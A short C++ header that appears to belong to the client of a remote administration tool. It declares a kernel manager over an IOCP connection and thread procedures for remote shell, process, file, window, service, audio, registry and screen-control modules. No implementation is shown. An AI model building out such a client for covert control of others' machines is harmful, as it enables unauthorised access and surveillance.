#pragma once
#include"Manager.h"





class CKernelManager :public CManager
{
public:
	CKernelManager(_CIOCPClient* IOCPClient);

	CKernelManager::~CKernelManager();
	VOID CKernelManager::HandleIO(PBYTE BufferData, ULONG BufferLength);
	VOID CKernelManager::ShutDownSyetem();
	

	HANDLE  m_ThreadHandle[0x1000];
	ULONG   m_ThreadHandleCount;
};

DWORD WINAPI RemoteMessageProcedure(LPVOID ParemeterData);
DWORD WINAPI ProcessManagerProcedure(LPVOID ParemeterData);
DWORD WINAPI CmdManagerProcedure(LPVOID ParemeterData);
DWORD WINAPI WindowManagerProcedure(LPVOID ParemeterData);
DWORD WINAPI RemoteControllerProcedure(LPVOID ParameterData);
DWORD WINAPI FileManagerProcedure(LPVOID ParemeterData);
DWORD WINAPI ServiceManagerProcedure(LPVOID ParemeterData);
DWORD WINAPI AudioManagerProcedure(LPVOID ParemeterData);
DWORD WINAPI RegisterManagerProcedure(LPVOID ParemeterData);